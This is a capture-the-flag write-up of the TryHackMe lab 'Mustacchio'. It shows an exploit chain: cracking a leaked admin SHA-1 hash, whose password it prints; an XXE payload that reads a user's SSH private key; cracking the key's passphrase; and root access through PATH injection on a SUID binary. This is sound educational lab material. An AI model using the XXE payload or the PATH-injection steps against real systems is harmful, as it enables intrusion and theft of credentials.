# 🛡️ TryHackMe – Mustacchio - Writeup

## 📌 Overview
**Room Name:** Mustacchio  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Exploitation / XXE / Privilege Escalation

Linux machine. A SQLite backup exposes admin credentials, XXE leaks an SSH private key, and a SUID binary with a relative path call enables PATH injection for root.

The attack chain involves:

- Web directory discovery revealing a SQLite database backup
- hashcat to crack admin credentials from the database
- XXE attack to extract Barry's SSH private key
- ssh2john and john to crack the key passphrase
- PATH Injection via a SUID binary calling `tail` with a relative path

---

## 🔍 1. Enumeration

### 🔎 Port Scanning

```bash
nmap -sC -sV <target_ip>
```

```text
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
8765/tcp open  http    nginx 1.10.3
```

- **80/tcp** — Standard website
- **8765/tcp** — Admin portal

### 🌐 Directory Brute-forcing
Using `gobuster`, discovered a `/custom/` directory. Inside its `js/` folder was a SQLite database backup file: **`users.bak`**.

---

## 🔓 2. Initial Access

### 🗄️ Database Analysis & Hash Cracking
Downloaded `users.bak` and queried it with `sqlite3`:

```bash
sqlite3 users.bak
sqlite> .tables
sqlite> SELECT * FROM users;
```

Retrieved admin credentials:

- **Username:** `admin`
- **Hash:** `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b` (SHA-1)

Cracked with `hashcat`:

- **Password:** `bulldog19`

### 🌐 XXE Attack — SSH Key Extraction
Logged into the admin panel on port `8765`. The `Add a comment` form processed XML input. Confirmed XXE vulnerability and crafted a payload to extract Barry's SSH private key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<root>
  <name>&xxe;</name>
  <author>Barry</author>
  <comment>Checking for SSH Key</comment>
</root>
```

Barry's encrypted private SSH key was returned in the response.

### 🔑 SSH Key Cracking
Converted the key and cracked the passphrase:

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Logged in as `barry`:

```bash
ssh -i id_rsa barry@<target_ip>
```

**Initial access as `barry` achieved.** ✅

```bash
cat user.txt
# [REDACTED]
```

---

## 👑 3. Privilege Escalation: barry → root

### 🔍 SUID Binary — PATH Injection
Found an interesting SUID binary at `/home/joe/live_log`. Analyzed with `strings`:

```bash
strings /home/joe/live_log
```

The binary internally executes `tail -f /var/log/nginx/access.log` using a **relative path** — making it vulnerable to PATH Injection.

### 🔓 Exploitation

```bash
# 1. Create a fake 'tail' that spawns bash
echo "/bin/bash" > /tmp/tail

# 2. Make it executable
chmod +x /tmp/tail

# 3. Prepend /tmp to PATH
export PATH=/tmp:$PATH

# 4. Run the SUID binary
/home/joe/live_log
```

The binary executed `/tmp/tail` with root privileges instead of the real `tail`.

**ROOT ACCESS GRANTED.** ✅

```bash
cat /root/root.txt
# [REDACTED]
```

---

## 📚 Key Takeaways

- 📂 **Leftover backup files are dangerous:** Leaving `.bak` files in web-accessible directories can hand an attacker a critical foothold.
- 🧩 **XXE enables file disclosure:** Allowing external entities in XML parsers directly leads to sensitive internal file reads — including SSH private keys.
- 🛠️ **SUID binaries must use absolute paths:** Calling system commands with relative paths inside SUID binaries makes them vulnerable to PATH Injection.

---

## 🛠️ Tools Used

- `nmap`
- `gobuster`
- `sqlite3`
- `hashcat`
- `ssh2john`, `john`
- `ssh`
- `strings`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
